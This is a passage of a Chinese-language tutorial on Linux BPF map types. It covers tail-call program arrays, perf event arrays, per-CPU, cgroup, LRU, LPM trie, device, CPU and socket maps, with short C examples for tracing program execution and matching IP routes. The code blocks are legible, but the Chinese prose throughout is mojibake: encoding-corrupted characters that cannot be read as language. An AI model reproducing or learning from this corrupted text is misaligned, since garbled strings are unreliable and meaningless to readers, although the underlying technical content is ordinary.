¸ä¸­ï¼Œç„¶åå°†å…¶æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦æ·»åŠ åˆ°æˆ‘ä»¬çš„ç¨‹åºæ˜ å°„ä¸­ã€‚</p><p>ç°åœ¨æˆ‘ä»¬å·²ç»å­˜å‚¨äº†è¯¥ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦ä¸€ä¸ªå°†è·³è½¬åˆ°å®ƒçš„BPFç¨‹åºã€‚ BPFç¨‹åºåªæœ‰åœ¨åŒç±»å‹çš„æƒ…å†µä¸‹æ‰èƒ½è·³è½¬åˆ°å…¶ä»–ç¨‹åºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç¨‹åºé™„åŠ åˆ°<code>kprobe</code>è·Ÿè¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/seccomp_phase1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_kprobe_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">1</span>;</span><br><span class="line"><span class="comment">/* dispatch into next BPF program */</span> </span><br><span class="line">  bpf_tail_call(ctx, &amp;programs, &amp;key);</span><br><span class="line">  <span class="comment">/* fall through when the program descriptor is not in the map */</span></span><br><span class="line"><span class="keyword">char</span> fmt[] = <span class="string">"missing program in prog_array map\n"</span>; </span><br><span class="line">  bpf_trace_printk(fmt, <span class="keyword">sizeof</span>(fmt));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>bpf_tail_call</code>å’Œ<code>BPF_MAP_TYPE_PROG_ARRAY</code>æœ€å¤šå¯ä»¥é“¾æ¥ 32 ä¸ªåµŒå¥—è°ƒç”¨ã€‚ è¿™æ ·å¯ä»¥é˜²æ­¢æ— é™å¾ªç¯å’Œå†…å­˜è€—å°½ã€‚</p><h4 id="Perfäº‹ä»¶æ•°ç»„æ˜ å°„"><a href="#Perfäº‹ä»¶æ•°ç»„æ˜ å°„" class="headerlink" title="Perfäº‹ä»¶æ•°ç»„æ˜ å°„"></a>Perfäº‹ä»¶æ•°ç»„æ˜ å°„</h4><p>è¿™äº›ç±»å‹çš„æ˜ å°„å°†<code>perf_events</code>æ•°æ®å­˜å‚¨åœ¨ç¯å½¢ç¼“å†²åŒºä¸­ï¼Œè¯¥ç¯å½¢ç¼“å†²åŒºåœ¨BPFç¨‹åºå’Œç”¨æˆ·ç©ºé—´ç¨‹åºä¹‹é—´è¿›è¡Œå®æ—¶é€šä¿¡ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code>ç±»å‹å®šä¹‰ã€‚ æ—¨åœ¨å°†å†…æ ¸è·Ÿè¸ªå·¥å…·å‘å‡ºçš„äº‹ä»¶è½¬å‘ç»™ç”¨æˆ·ç©ºé—´ç¨‹åºä»¥åšè¿›ä¸€æ­¥å¤„ç†ã€‚ç”¨æˆ·ç©ºé—´ç¨‹åºå……å½“ç›‘å¬å™¨ï¼Œç­‰å¾…æ¥è‡ªå†…æ ¸çš„äº‹ä»¶ï¼Œå› æ­¤ä½ éœ€è¦ç¡®ä¿ä½ å†™çš„ä»£ç åœ¨å†…æ ¸ä¸­çš„BPFç¨‹åºåˆå§‹åŒ–ä¹‹å‰å¼€å§‹ç›‘å¬ã€‚</p><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•è·Ÿè¸ªè®¡ç®—æœºæ‰§è¡Œçš„æ‰€æœ‰ç¨‹åºã€‚ åœ¨è¿›å…¥BPFç¨‹åºä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å£°æ˜æˆ‘ä»¬å°†ä»å†…æ ¸å‘é€åˆ°ç”¨æˆ·ç©ºé—´çš„äº‹ä»¶ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="keyword">char</span> program_name[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºå°†äº‹ä»¶å‘é€åˆ°ç”¨æˆ·ç©ºé—´çš„æ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> events </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PERF_EVENT_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(u32), </span><br><span class="line">  .max_entries = <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬å£°æ˜äº†æ•°æ®ç±»å‹å’Œæ˜ å°„åï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºæ•è·æ•°æ®å¹¶å°†å…¶å‘é€åˆ°ç”¨æˆ·ç©ºé—´çš„BPFç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/sys_exec"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_capture_exec</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">data_t</span> data;</span><br><span class="line"><span class="comment">// bpf_get_current_pid_tgid returns the current process identifier </span></span><br><span class="line">  data.pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>;</span><br><span class="line">  <span class="comment">// bpf_get_current_comm loads the current executable name</span></span><br><span class="line">bpf_get_current_comm(&amp;data.program_name, <span class="keyword">sizeof</span>(data.program_name)); </span><br><span class="line">  bpf_perf_event_output(ctx, &amp;events, <span class="number">0</span>, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ä»£ç æ®µä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>bpf_perf_event_output</code>å°†æ•°æ®é™„ç€åˆ°<code>map</code>ä¸­ã€‚ å› ä¸ºè¿™æ˜¯ä¸€ä¸ªå®æ—¶ç¼“å†²åŒºï¼Œæ‰€ä»¥ä½ ä¸å¿…æ‹…å¿ƒ<code>map</code>ä¸­å…ƒç´ çš„é”®ï¼Œå†…æ ¸è´Ÿè´£å°†æ–°å…ƒç´ æ·»åŠ åˆ°<code>map</code>å¹¶åœ¨ç”¨æˆ·ç©ºé—´ç¨‹åºå¤„ç†å®ƒååˆ·æ–°å®ƒã€‚</p><h4 id="Per-CPUå“ˆå¸Œæ˜ å°„"><a href="#Per-CPUå“ˆå¸Œæ˜ å°„" class="headerlink" title="Per-CPUå“ˆå¸Œæ˜ å°„"></a>Per-CPUå“ˆå¸Œæ˜ å°„</h4><p>è¿™ç§ç±»å‹çš„æ˜ å°„æ˜¯<code>BPF_MAP_TYPE_HASH</code>çš„æ”¹è¿›ç‰ˆæœ¬ã€‚ è¿™äº›æ˜ å°„ä½¿ç”¨<code>BPF_MAP_TYPE_PERCPU_HASH</code>ç±»å‹å®šä¹‰ã€‚ å½“ä½ åˆ†é…å…¶ä¸­ä¸€ä¸ªæ˜ å°„æ—¶ï¼Œæ¯ä¸ªCPUéƒ½ä¼šçœ‹åˆ°å®ƒè‡ªèº«éš”ç¦»ç‰ˆæœ¬çš„æ˜ å°„ï¼Œè¿™ä½¿å¾—é«˜æ€§èƒ½æŸ¥æ‰¾å’Œèšåˆæ›´åŠ é«˜æ•ˆã€‚ å¦‚æœä½ çš„BPFç¨‹åºæ”¶é›†æŒ‡æ ‡å¹¶å°†å®ƒä»¬èšåˆåˆ°å“ˆå¸Œè¡¨æ˜ å°„ä¸­ï¼Œä½¿ç”¨è¿™ç§ç±»å‹çš„æ˜ å°„å°±å¾ˆæœ‰ç”¨ã€‚</p><h4 id="Per-CPUæ•°ç»„æ˜ å°„"><a href="#Per-CPUæ•°ç»„æ˜ å°„" class="headerlink" title="Per-CPUæ•°ç»„æ˜ å°„"></a>Per-CPUæ•°ç»„æ˜ å°„</h4><p>è¿™ç§ç±»å‹çš„åœ°å›¾ä¹Ÿæ˜¯<code>BPF_MAP_TYPE_ARRAY</code>çš„æ”¹è¿›ç‰ˆæœ¬ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>ç±»å‹å®šä¹‰ã€‚</p><h4 id="å †æ ˆè·Ÿè¸ªæ˜ å°„"><a href="#å †æ ˆè·Ÿè¸ªæ˜ å°„" class="headerlink" title="å †æ ˆè·Ÿè¸ªæ˜ å°„"></a>å †æ ˆè·Ÿè¸ªæ˜ å°„</h4><p>è¿™ç§ç±»å‹çš„æ˜ å°„å­˜å‚¨æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„å †æ ˆè·Ÿè¸ªã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_STACK_TRACE</code>ç±»å‹å®šä¹‰ã€‚ é™¤äº†è¿™ä¸ªæ˜ å°„ï¼Œå†…æ ¸å¼€å‘äººå‘˜å·²ç»æ·»åŠ äº†å¸®åŠ©ç¨‹åº<code>bpf_get_stackid</code>æ¥å¸®åŠ©ä½ ä½¿ç”¨å †æ ˆè·Ÿè¸ªå¡«å……è¿™ä¸ªæ˜ å°„ã€‚æ­¤å¸®åŠ©ç¨‹åºå°†æ˜ å°„ä½œä¸ºå‚æ•°å’Œä¸€ç³»åˆ—æ ‡å¿—ï¼Œä»¥ä¾¿ä½ å¯ä»¥æŒ‡å®šæ˜¯å¦åªéœ€è¦æ¥è‡ªå†…æ ¸ã€åªæ¥è‡ªç”¨æˆ·ç©ºé—´æˆ–ä¸¤è€…çš„è·Ÿè¸ªã€‚å¸®åŠ©å™¨è¿”å›ä¸æ·»åŠ åˆ°<code>map</code>ä¸­çš„å…ƒç´ å…³è”çš„é”®ã€‚</p><h4 id="Cgroupæ•°ç»„æ˜ å°„"><a href="#Cgroupæ•°ç»„æ˜ å°„" class="headerlink" title="Cgroupæ•°ç»„æ˜ å°„"></a>Cgroupæ•°ç»„æ˜ å°„</h4><p>è¿™ç§ç±»å‹çš„æ˜ å°„å­˜å‚¨å¯¹<code>cgroups</code>çš„å¼•ç”¨ã€‚<code>Cgroup</code>æ•°ç»„æ˜ å°„ä½¿ç”¨<code>BPF_MAP_TYPE_CGROUP_ARRAY</code>ç±»å‹å®šä¹‰ã€‚ æœ¬è´¨ä¸Šï¼Œå®ƒä»¬çš„è¡Œä¸ºç±»ä¼¼äº<code>BPF_MAP_TYPE_PROG_ARRAY</code>ï¼Œä½†å®ƒä»¬å­˜å‚¨æŒ‡å‘<code>cgroup</code>çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ã€‚</p><p>å½“ä½ å¸Œæœ›åœ¨<code>BPF map</code>ä¹‹é—´å…±äº«<code>cgroup</code>å¼•ç”¨ä»¥æ§åˆ¶æµé‡ã€è°ƒè¯•å’Œæµ‹è¯•æ—¶ï¼Œè¯¥æ˜ å°„ä¼šéå¸¸æœ‰ç”¨ã€‚ è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªå¦‚ä½•å¡«å……æ­¤æ˜ å°„çš„ç¤ºä¾‹ã€‚ æˆ‘ä»¬ä»æ˜ å°„å®šä¹‰å¼€å§‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> cgroups_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_CGROUP_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), </span><br><span class="line">  .max_entries = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰“å¼€åŒ…å«<code>cgroup</code>ä¿¡æ¯çš„æ–‡ä»¶æ¥æ‹¿åˆ°<code>cgroup</code>çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ æˆ‘ä»¬å°†æ‰“å¼€æ§åˆ¶<code>Docker</code>å®¹å™¨çš„åŸºæœ¬CPUé¢åº¦çš„<code>cgroup</code>ï¼Œå¹¶å°†è¯¥<code>cgroup</code>å­˜å‚¨åœ¨æˆ‘ä»¬çš„æ˜ å°„ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cgroup_fd, key = <span class="number">0</span>;</span><br><span class="line">cgroup_fd = open(<span class="string">"/sys/fs/cgroup/cpu/docker/cpu.shares"</span>, O_RDONLY);</span><br><span class="line">bpf_update_elem(&amp;cgroups_map, &amp;key, &amp;cgroup_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="LRUå“ˆå¸Œå’ŒPer-CPUå“ˆå¸Œæ˜ å°„"><a href="#LRUå“ˆå¸Œå’ŒPer-CPUå“ˆå¸Œæ˜ å°„" class="headerlink" title="LRUå“ˆå¸Œå’ŒPer-CPUå“ˆå¸Œæ˜ å°„"></a>LRUå“ˆå¸Œå’ŒPer-CPUå“ˆå¸Œæ˜ å°„</h4><p>è¿™ä¸¤ç§ç±»å‹çš„æ˜ å°„æ˜¯å“ˆå¸Œè¡¨æ˜ å°„ï¼Œä½†å®ƒä»¬ä¹Ÿå®ç°äº†å†…éƒ¨LRUç¼“å­˜ã€‚ LRUä»£è¡¨æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼Œè¿™æ„å‘³ç€å¦‚æœæ˜ å°„å·²æ»¡ï¼Œè¿™äº›æ˜ å°„å°†åˆ é™¤ä¸ç»å¸¸ä½¿ç”¨çš„å…ƒç´ ï¼Œä»¥ä¾¿ä¸ºæ˜ å°„ä¸­çš„æ–°å…ƒç´ è…¾å‡ºç©ºé—´ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™äº›æ˜ å°„æ¥æ’å…¥è¶…å‡ºæœ€å¤§é™åˆ¶çš„å…ƒç´ ï¼Œåªè¦ä¸ä»‹æ„ä¸¢å¤±æœ€è¿‘æœªä½¿ç”¨çš„å…ƒç´ ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_LRU_HASH</code>å’Œ<code>BPF_MAP_TYPE_LRU_PERCPU_HASH</code>ç±»å‹å®šä¹‰ã€‚</p><p>æ­¤æ˜ å°„çš„<code>per cpu</code>ç‰ˆæœ¬ä¸ä¹‹å‰çœ‹åˆ°çš„å…¶ä»–<code>per cpu</code>æ˜ å°„ç•¥æœ‰ä¸åŒã€‚ è¯¥æ˜ å°„åªä¿ç•™ä¸€ä¸ªå“ˆå¸Œè¡¨æ¥å­˜å‚¨æ˜ å°„ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œå¹¶ä¸”æ¯ä¸ªCPUä½¿ç”¨ä¸åŒçš„LRUç¼“å­˜ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿æ¯ä¸ªCPUä¸­æœ€å¸¸ç”¨çš„å…ƒç´ ä¿ç•™åœ¨æ˜ å°„ä¸­ã€‚</p><h4 id="LPM-Trieæ˜ å°„"><a href="#LPM-Trieæ˜ å°„" class="headerlink" title="LPM Trieæ˜ å°„"></a>LPM Trieæ˜ å°„</h4><p><code>LPM trie</code>æ˜ å°„æ˜¯ä½¿ç”¨æœ€é•¿å‰ç¼€åŒ¹é…(LPM)æ¥æŸ¥æ‰¾æ˜ å°„ä¸­å…ƒç´ çš„æ˜ å°„ç±»å‹ã€‚LPMæ˜¯ä¸€ç§ç®—æ³•ï¼Œå®ƒä»æ ‘ä¸­çš„ä»»ä½•å…¶ä»–åŒ¹é…é¡¹ä¸­é€‰æ‹©ä¸æœ€é•¿æŸ¥æ‰¾é”®åŒ¹é…çš„å…ƒç´ ã€‚æ­¤ç®—æ³•ç”¨äºä¿ç•™æµé‡è½¬å‘è¡¨ä»¥å°†IPåœ°å€ä¸ç‰¹å®šè·¯ç”±çš„è·¯ç”±å™¨å’Œå…¶ä»–è®¾å¤‡è¿›è¡ŒåŒ¹é…ã€‚ è¿™äº›æ˜ å°„ä½¿ç”¨<code>BPF_MAP_TYPE_LPM_TRIE</code>ç±»å‹å®šä¹‰ã€‚</p><p>è¿™äº›æ˜ å°„è¦æ±‚<code>key</code>çš„å¤§å°ä¸º8çš„å€æ•°ï¼ŒèŒƒå›´ä¸º8åˆ°2048ã€‚ å¦‚æœä½ ä¸æƒ³å®ç°è‡ªå·±çš„<code>key</code>ï¼Œå†…æ ¸æä¾›äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œå¯ä»¥å°†å…¶ç”¨äºè¿™äº›<code>keys</code>ï¼Œç§°ä¸º<code>bpf_lpm_trie_key</code>ã€‚</p><p>åœ¨ä¸‹ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä¸¤ä¸ªè½¬å‘è·¯ç”±æ·»åŠ åˆ°æ˜ å°„å¹¶å°è¯•å°†IPåœ°å€åŒ¹é…åˆ°æ­£ç¡®çš„è·¯ç”±ã€‚ é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºæ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> routing_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_LPM_TRIE,</span><br><span class="line">.key_size = <span class="number">8</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">10000</span>,</span><br><span class="line">  .map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä½¿ç”¨ä¸‰ä¸ªè½¬å‘è·¯ç”±å¡«å……æ­¤æ˜ å°„: <code>192.168.0.0/16ã€192.168.0.0/24 å’Œ 192.168.1.0/24</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> value_1 = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_1</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">16</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_2 = <span class="number">2</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_2</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_3 = <span class="number">3</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_3</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;;</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_1, &amp;value_1, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_2, &amp;value_2, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_3, &amp;value_3, BPF_ANY);</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ç›¸åŒçš„<code>keys</code>ç»“æ„æ¥æŸ¥æ‰¾IPåœ°å€<code>192.168.1.1/32</code>çš„æ­£ç¡®åŒ¹é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">lookup</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, .prefixlen = <span class="number">32</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ret = bpf_map_lookup_elem(&amp;routing_map, &amp;lookup, &amp;result); </span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, result);</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œ<code>192.168.0.0/16</code>å’Œ<code>192.168.1.0/24</code>éƒ½å¯ä»¥åŒ¹é…æŸ¥æ‰¾IPï¼Œå› ä¸ºè¯¥IPéƒ½åœ¨è¿™ä¸¤ä¸ªèŒƒå›´å†…ã€‚ ä½†æ˜¯ï¼Œç”±äºè¯¥æ˜ å°„ä½¿ç”¨LPM ç®—æ³•ï¼Œç»“æœå°†å¡«å……é”®ä¸º<code>192.168.1.0/24</code>çš„å€¼ã€‚</p><h4 id="æ•°ç»„æ˜ å°„å’Œå“ˆå¸Œæ˜ å°„"><a href="#æ•°ç»„æ˜ å°„å’Œå“ˆå¸Œæ˜ å°„" class="headerlink" title="æ•°ç»„æ˜ å°„å’Œå“ˆå¸Œæ˜ å°„"></a>æ•°ç»„æ˜ å°„å’Œå“ˆå¸Œæ˜ å°„</h4><p><code>BPF_MAP_TYPE_ARRAY_OF_MAPS</code>å’Œ<code>BPF_MAP_TYPE_HASH_OF_MAPS</code>æ˜¯å­˜å‚¨å¯¹å…¶å®ƒæ˜ å°„çš„å¼•ç”¨çš„ä¸¤ç§ç±»å‹çš„æ˜ å°„ã€‚ å®ƒä»¬ä»…æ”¯æŒä¸€çº§é—´æ¥å¼•ç”¨ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨å®ƒä»¬æ¥å­˜å‚¨æ˜ å°„çš„æ˜ å°„çš„æ˜ å°„ã€‚ è¿™å¯ç¡®ä¿ä¸ä¼šå› æ„å¤–å­˜å‚¨æ— é™é“¾å¼æ˜ å°„è€Œæ¶ˆè€—æ‰€æœ‰å†…å­˜ã€‚</p><p>å½“ä½ å¸Œæœ›åœ¨è¿è¡Œæ—¶æ›¿æ¢æ•´ä¸ªæ˜ å°„æ—¶ï¼Œè¿™äº›ç±»å‹çš„æ˜ å°„å¾ˆæœ‰ç”¨ã€‚ å¦‚æœä½ çš„æ‰€æœ‰æ˜ å°„éƒ½æ˜¯å…¨å±€æ˜ å°„çš„å­é›†ï¼Œé‚£ä¹ˆå¯ä»¥åˆ›å»ºå…¨çŠ¶æ€å¿«ç…§ã€‚ å†…æ ¸ç¡®ä¿çˆ¶æ˜ å°„ä¸­çš„ä»»ä½•æ›´æ–°æ“ä½œéƒ½ç­‰åˆ°æ‰€æœ‰æ—§çš„å­æ˜ å°„çš„å¼•ç”¨éƒ½è¢«åˆ é™¤åæ‰å®Œæˆæ“ä½œã€‚</p><h4 id="Device-Mapæ˜ å°„"><a href="#Device-Mapæ˜ å°„" class="headerlink" title="Device Mapæ˜ å°„"></a>Device Mapæ˜ å°„</h4><p>è¿™ç§ç‰¹æ®Šç±»å‹çš„æ˜ å°„å­˜å‚¨å¯¹ç½‘ç»œè®¾å¤‡çš„å¼•ç”¨ã€‚è¿™äº›æ˜ å°„ä½¿ç”¨<code>BPF_MAP_TYPE_DEVMAP</code>ç±»å‹å®šä¹‰ã€‚ å®ƒä»¬å¯¹æƒ³åœ¨å†…æ ¸çº§åˆ«æ“çºµæµé‡çš„ç½‘ç»œåº”ç”¨ç¨‹åºå¾ˆæœ‰ç”¨ã€‚ä½ å¯ä»¥æ„å»ºæŒ‡å‘ç‰¹å®šç½‘ç»œè®¾å¤‡çš„ç«¯å£è™šæ‹Ÿæ˜ å°„ï¼Œç„¶åä½¿ç”¨å¸®åŠ©å™¨<code>bpf_redirect_map</code>é‡å®šå‘æ•°æ®åŒ…ã€‚</p><h4 id="CPU-Mapæ˜ å°„"><a href="#CPU-Mapæ˜ å°„" class="headerlink" title="CPU Mapæ˜ å°„"></a>CPU Mapæ˜ å°„</h4><p><code>BPF_MAP_TYPE_CPUMAP</code>æ˜¯å¦ä¸€ç§å…è®¸è½¬å‘ç½‘ç»œæµé‡çš„æ˜ å°„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ˜ å°„å­˜å‚¨å¯¹ä¸»æœºä¸­ä¸åŒCPUçš„å¼•ç”¨ã€‚ ä¸ä¹‹å‰çš„æ˜ å°„ç±»å‹ä¸€æ ·ï¼Œä½ å¯ä»¥å°†å…¶ä¸<code>bpf_redirect_map</code>å¸®åŠ©ç¨‹åºä¸€èµ·ä½¿ç”¨æ¥é‡å®šå‘æ•°æ®åŒ…ã€‚ä½†æ˜¯ï¼Œæ­¤æ˜ å°„å°†æ•°æ®åŒ…å‘é€åˆ°ä¸åŒçš„CPUã€‚è¿™å…è®¸å°†ç‰¹å®šCPUåˆ†é…ç»™ç½‘ç»œå †æ ˆä»¥å®ç°å¯æ‰©å±•æ€§å’Œéš”ç¦»ç›®çš„ã€‚</p><h4 id="Open-Socketæ˜ å°„"><a href="#Open-Socketæ˜ å°„" class="headerlink" title="Open Socketæ˜ å°„"></a>Open Socketæ˜ å°„</h4><p><code>BPF_MAP_TYPE_XSKMAP</code>æ˜¯ä¸€ç§å­˜å‚¨å¯¹æ‰“å¼€å¥—æ¥å­—çš„å¼•ç”¨çš„æ˜ å°„ã€‚ ä¸ä¹‹å‰çš„æ˜ å°„ä¸€æ ·ï¼Œè¿™äº›æ˜ å°„å¯¹äºå¥—æ¥å­—ä¹‹é—´è½¬å‘æ•°æ®åŒ…å¾ˆæœ‰ç”¨ã€‚</p><h4 id="Socket-Arrayå’ŒHashæ˜ å°„"><a href="#Socket-Arrayå’ŒHashæ˜ å°„" class="headerlink" title="Socket Arrayå’ŒHashæ˜ å°„"></a>Socket Arrayå’ŒHashæ˜ å°„</h4><p><code>BPF_MAP_TYPE_SOCKMAP</code>å’Œ<code>BPF_MAP_TYPE_SOCKHASH</code>æ˜¯ä¸¤ä¸ªä¸“é—¨çš„æ˜ å°„ï¼Œå®ƒä»¬å­˜å‚¨å¯¹å†…æ ¸ä¸­æ‰“å¼€å¥—æ¥å­—çš„å¼•ç”¨ã€‚ ä¸å‰é¢çš„æ˜ å°„ä¸€æ ·ï¼Œè¿™ç§ç±»å‹çš„æ˜ å°„ä¸å¸®åŠ©ç¨‹åº<code>bpf_redirect_map</code>ä¸€èµ·ä½¿ç”¨ï¼Œå°†å¥—æ¥å­—ç¼“å†²åŒºä»å½“å‰XDPç¨‹åºè½¬å‘åˆ°ä¸åŒçš„å¥—æ¥å­—ã€‚</p><p>å®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºå…¶ä¸­ä¸€ä¸ªä½¿ç”¨æ•°ç»„æ¥å­˜å‚¨å¥—æ¥å­—ï¼Œè€Œå¦ä¸€ä¸ªä½¿ç”¨å“ˆå¸Œè¡¨ã€‚ä½¿ç”¨å“ˆå¸Œè¡¨çš„å¥½å¤„æ˜¯ä½ å¯ä»¥ç›´æ¥é€šè¿‡å®ƒçš„é”®è®¿é—®ä¸€ä¸ªå¥—æ¥å­—ï¼Œè€Œä¸éœ€è¦éå†å®Œæ•´çš„æ˜ å°„æ¥æ‰¾åˆ°å®ƒã€‚å†…æ 